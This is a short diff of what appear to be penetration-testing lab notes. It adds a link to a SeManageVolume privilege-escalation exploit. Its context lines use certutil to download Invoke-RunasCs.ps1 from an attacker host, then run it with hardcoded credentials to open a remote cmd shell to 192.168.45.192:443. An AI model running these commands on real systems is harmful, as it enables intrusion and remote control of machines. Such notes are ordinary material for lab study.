@@ -983,6 +983,7 @@ certutil -urlcache -split -f http://192.168.45.192/Invoke-RunasCs.ps1
 import-module .\Invoke-RunasCs.ps1
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd.exe" -Remote 192.168.45.192:443
 
+# https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 ```
 
 ### Resourced
